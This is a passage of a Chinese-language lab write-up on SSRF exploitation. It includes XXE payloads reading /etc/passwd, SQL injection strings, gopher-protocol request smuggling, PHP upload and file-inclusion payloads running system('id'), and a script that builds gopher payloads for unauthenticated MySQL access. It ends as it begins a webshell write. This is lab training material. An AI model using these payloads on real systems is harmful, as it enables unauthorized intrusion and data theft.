class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后用bp抓包修改，gopher伪协议访问抓包</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.6:80/_</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509205535253.png" alt="image-20250509205535253"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509205548841.png" alt="image-20250509205548841"></p><p>放入重放器，将刚才的payload放入进行两次url编码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509213551266.png" alt="image-20250509213551266"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509213728608.png" alt="image-20250509213728608"></p><p>得到的响应也是xml格式的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看源代码中的这部分</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509210529088.png" alt="image-20250509210529088"></p><p>这里响应的code为0，说明登录失败了，然后会显示msg是用户名为admin，注意这里会回显用户名的，可以用来回显文件内容</p><p>实验结束，然后就可以构造一个进行任意文件读取的payload了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.6<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>131<br><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">benben</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;benben;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>这里就是定义了一个实体<code>benben</code>，引入了外部实体<code>SYSTEM</code>，这个外部实体指向的文件路径是<code>file:///etc/passwd</code>，就相当于现在<code>benben</code>代表的是<code>/etc/passwd</code>这个文件</li><li>然后在填写用户名的地方填写<code>&amp;benben;</code>引用<code>benben</code>实体，因为刚才实验可知会返回用户名的内容，所以这里会回显<code>/etc/passwd</code>的文件内容，实现了任意文件读取</li></ul><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509214128766.png" alt="image-20250509214128766"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509214203895.png" alt="image-20250509214203895"></p><h3 id="使用SSRF进行SQL注入"><a href="#使用SSRF进行SQL注入" class="headerlink" title="使用SSRF进行SQL注入"></a>使用SSRF进行SQL注入</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.11/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423182926236.png" alt="image-20250423182926236"></p><h4 id="SQL注入语句"><a href="#SQL注入语句" class="headerlink" title="SQL注入语句"></a>SQL注入语句</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 查询列数</span><br>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20group%20by%203--%20</span><br><span class="hljs-string"># 查询回显位</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--%<span class="hljs-number">20</span><br><span class="hljs-comment"># 查询数据库名</span><br>/?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20union%20select%201,2,database()--%20</span><br><span class="hljs-string"># 查询表名</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>information_schema.tables%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>table_schema=<span class="hljs-title function_ invoke__">database</span>()--%<span class="hljs-number">20</span><br><span class="hljs-comment"># 查询列名</span><br>/?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&#x27;</span>users<span class="hljs-string">&#x27;%20and%20table_schema=database()--%20</span><br><span class="hljs-string"># 查询数据</span><br><span class="hljs-string">/?id=-1&#x27;</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(username,<span class="hljs-string">&#x27;-&#x27;</span>,password)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>users--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li><strong>所有空格的地方都要用<code>+</code>或<code>%20</code>表示</strong></li></ul><p>直接填写空格会报错</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --+<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185549061.png" alt="image-20250423185549061"></p><p>可以使用<code>+</code>替换</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;+--+<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185608042.png" alt="image-20250423185608042"></p><p>可以使用<code>%20</code>替换</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185017524.png" alt="image-20250423185017524"></p><p>也可以两个混合使用</p><ul><li><strong>用<code>HackBar</code>进行提交要把所有的空格进行两次URL编码为<code>%25%20</code>，或者直接使用<code>+</code></strong></li></ul><p>只进行一次URL编码会报错</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">20</span>group%<span class="hljs-number">20</span>by%<span class="hljs-number">203</span>--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423190639575.png" alt="image-20250423190639575"></p><p>要进行两次URL编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">2520</span>group%<span class="hljs-number">2520</span>by%<span class="hljs-number">25203</span>--%<span class="hljs-number">2520</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191100481.png" alt="image-20250423191100481"></p><p>或者直接全部使用<code>+</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;+group+by+<span class="hljs-number">3</span>--+<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191158425.png" alt="image-20250423191158425"></p><h4 id="要用POST提交进行SQL注入"><a href="#要用POST提交进行SQL注入" class="headerlink" title="要用POST提交进行SQL注入"></a>要用POST提交进行SQL注入</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.11</span>/Less-<span class="hljs-number">11</span>/<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191605610.png" alt="image-20250423191605610"></p><p>查看源代码，可以看要用POST提交三个参数</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191758724.png" alt="image-20250423191758724"></p><p>SSRF里POST提交就要使用<code>gopher</code>伪协议</p><p>可以进行一次抓包，构造出POC</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.11:80</span>/_POST /Less-<span class="hljs-number">11</span>/index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">172.250.250.11</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">53</span><br><br><span class="hljs-attribute">uname</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> #&amp;passwd=<span class="hljs-number">123</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423193017235.png" alt="image-20250423193017235"></p><p>进行两次URL编码</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423193135040.png" alt="image-20250423193135040"></p><h3 id="使用SSRF进行文件上传"><a href="#使用SSRF进行文件上传" class="headerlink" title="使用SSRF进行文件上传"></a>使用SSRF进行文件上传</h3><h4 id="multipart-form-data的定义"><a href="#multipart-form-data的定义" class="headerlink" title="multipart/form-data的定义"></a><code>multipart/form-data</code>的定义</h4><p><code>multipart/form-data</code>是在 HTTP 协议里用于表单数据提交的一种编码方式，这个数据体由多个部分组成，每个部分被一个固定边界值分隔</p><p><strong>简单的说就是一个分隔符，将POST多个提交内容使用分界线拼接起来</strong></p><p>如下是进行一次文件上传的抓包</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194434594.png" alt="image-20250423194434594"></p><h4 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.250.250.14</span>/Pass-<span class="hljs-number">01</span>/index.php<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194302965.png" alt="image-20250423194302965"></p><p>查看源代码，寻找之后要构造的payload的部分</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194737386.png" alt="image-20250423194737386"></p><p>首先定义分界线，这是必需的，其中的<code>boundary</code>的值可以随便定义，这里使用<code>$&#123;Boundary&#125;</code>作为分界线</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary=$&#123;<span class="hljs-type">Boundary</span>&#125;</span><br></code></pre></td></tr></table></figure><p>使用分界线，要在定义好的分界线前要加上两个减号</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--$&#123;Boundary&#125;</span><br></code></pre></td></tr></table></figure><p>根据源码进行编写提交的内容，首先是上传的文件与文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php&quot;</span><br>Content-Type: image/jpeg<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后使用分界线分隔开</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--$&#123;Boundary&#125;</span><br></code></pre></td></tr></table></figure><p>接着继续根据源码编写另一个POST提交的内容submit，这部分可省略</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;submit&quot;</span><br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>;<span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br><br>上传<br></code></pre></td></tr></table></figure><p>最后再使用一次分界线，并且最后加上俩减号</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">$&#123;Boundary&#125;</span><span class="hljs-literal">--</span><br></code></pre></td></tr></table></figure><p>完整的payload为</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary=$&#123;<span class="hljs-type">Boundary</span>&#125;</span><br><br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php&quot;</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: image/jpeg<br><br>&lt;?php phpinfo();?&gt;<br><br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;submit&quot;</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: text/plain;charset=<span class="hljs-type">UTF</span>-<span class="hljs-number">8</span><br><br>上传<br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="构造出完整的gopher提交数据"><a href="#构造出完整的gopher提交数据" class="headerlink" title="构造出完整的gopher提交数据"></a>构造出完整的<code>gopher</code>提交数据</h4><p>可以通过抓包获取数据进行构造</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Pass-01/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.14<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryy0nfsJQPiWB4Y9qs<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>306<br><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"> <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">上传</span><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC--</span><br></code></pre></td></tr></table></figure><p>使用<code>gopher</code>伪协议进行上传</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423201834987.png" alt="image-20250423201834987"></p><p>进行两次URL编码后提交，会得到文件路径（上面的那个payload不知道为什么传之后得不到文件路径，这直接用的视频里的）</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423204852849.png" alt="image-20250423204852849"></p><p>最后可以使用<code>http</code>伪协议查看上传的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.250</span>.<span class="hljs-number">250.14</span><span class="hljs-regexp">/upload/</span>phpinfo.php<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423205317234.png" alt="image-20250423205317234"></p><h3 id="使用SSRF进行文件包含"><a href="#使用SSRF进行文件包含" class="headerlink" title="使用SSRF进行文件包含"></a>使用SSRF进行文件包含</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.14/include.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423211557880.png" alt="image-20250423211557880"></p><h4 id="直接使用伪协议包含读取文件"><a href="#直接使用伪协议包含读取文件" class="headerlink" title="直接使用伪协议包含读取文件"></a>直接使用伪协议包含读取文件</h4><p>可以直接提交一个参数就能读取文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">172.250</span><span class="hljs-number">.250</span><span class="hljs-number">.14</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423211807854.png" alt="image-20250423211807854"></p><p>如果使用<code>data://</code>这种伪协议，含有空格的要使用URL编码，或者使用<code>+</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://172.250.250.14/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>system(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423212036497.png" alt="image-20250423212036497"></p><p>如果是POST提交的参数，就和前面的漏洞利用一样使用<code>gopher</code>伪协议</p><h2 id="SSRF之对MySQL进行未授权操作"><a href="#SSRF之对MySQL进行未授权操作" class="headerlink" title="SSRF之对MySQL进行未授权操作"></a>SSRF之对MySQL进行未授权操作</h2><h3 id="使用SSRF对MySQL进行未授权查询"><a href="#使用SSRF对MySQL进行未授权查询" class="headerlink" title="使用SSRF对MySQL进行未授权查询"></a>使用SSRF对MySQL进行未授权查询</h3><p>这里的未授权是MySQL的数据库没有设置密码，并且允许用户登录数据库</p><h4 id="如何与MySQL进行数据通讯"><a href="#如何与MySQL进行数据通讯" class="headerlink" title="如何与MySQL进行数据通讯"></a>如何与MySQL进行数据通讯</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">-</span>uroot进入MySQL<br><span class="hljs-keyword">show</span> databases;查看数据库<br></code></pre></td></tr></table></figure><p>通过SSRF查看数据库<code>security</code>下表<code>user</code>的内容</p><h4 id="抓取本地MySQL数据库通讯内容构造payload"><a href="#抓取本地MySQL数据库通讯内容构造payload" class="headerlink" title="抓取本地MySQL数据库通讯内容构造payload"></a>抓取本地MySQL数据库通讯内容构造payload</h4><p><strong>工具：</strong><code>tcpdump</code>、<code>Wireshark</code></p><p>也可以直接只用<code>Wireshark</code>抓取数据包并进行十六进制展示，再编程URL编码进行提交</p><ul><li>开始抓包，监听 lo 回环地址接口网卡的3306端口，-w写入文件<code>mysql.pcapng</code>生成在根目录下</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i lo port <span class="hljs-number">3306</span> -w mysql.pcapng<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224515084.png" alt="image-20250423224515084"></p><ul><li>写入指令</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mysql -h127.0.0.1 -uroot <span class="hljs-attribute">--ssl-mode</span>=DISABLED -e <span class="hljs-string">&quot;show databases;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224444109.png" alt="image-20250423224444109"></p><p>然后就可以停止监听，并且可以在根目录看到<code>mysql.pcapng</code>文件</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224639293.png" alt="image-20250423224639293"></p><p>把文件复制到本地，用Wireshark打开，找到三次TCP握手，右键&#x3D;》跟踪流&#x3D;》TCP流</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224913559.png" alt="image-20250423224913559"></p><p>会得到以下数据流，红色的是自己主机发给MySQL服务器的数据流，蓝色的是接收的</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225102697.png" alt="image-20250423225102697"></p><p>构造POC的只需要红色部分的，所以要进行过滤</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225255357.png" alt="image-20250423225255357"></p><p>还要改成原始数据</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225332934.png" alt="image-20250423225332934"></p><p>最后得到的就是要使用的构造POC的内容</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225410894.png" alt="image-20250423225410894"></p><p>对以上数据还要进行一些修改，要去掉换行符，还要将ASCII码转化为URL编码</p><p>ASCII码转化为URL编码的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://172.250.250.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    s=sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(results(s))<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225852400.png" alt="image-20250423225852400"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423230019375.png" alt="image-20250423230019375"></p><p>将得到的payload在SSRF服务器提交，就可以获得数据库查询结果</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423230118363.png" alt="image-20250423230118363"></p><h4 id="使用工具构造payload"><a href="#使用工具构造payload" class="headerlink" title="使用工具构造payload"></a>使用工具构造payload</h4><p>拉取工具</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/tarunkant/Gopherus<br></code></pre></td></tr></table></figure><p>进行攻击</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cd Gopherus<br>python2<span class="hljs-number">.7</span> gopherus.py <span class="hljs-comment">--exploit mysql</span><br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424001659075.png" alt="image-20250424001659075"></p><p>把<code>127.0.0.1</code>改成服务器地址<code>172.250.250.1</code></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423233735101.png" alt="image-20250423233735101"></p><h3 id="使用SSRF对MySQL进行未授权文件写入"><a href="#使用SSRF对MySQL进行未授权文件写入" class="headerlink" title="使用SSRF对MySQL进行未授权文件写入"></a>使用SSRF对MySQL进行未授权文件写入</h3><p>查看写入权限</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423235910306.png" alt="image-20250423235910306"></p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000044507.png" alt="image-20250424000044507"></p><p>查看源码，会发现下面<code>secure_file_priv</code>这里没有值，就有写入权限</p><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000201569.png" alt="image-20250424000201569"></p><h4 id="使用工具构造payload-1"><a href="#使用工具构造payload-1" class="headerlink" title="使用工具构造payload"></a>使用工具构造payload</h4><p>使用<code>into outfile</code>生成文件<code>cmd.php</code>并写入一句话</p><figure class="highlight sql"><table><tr><td 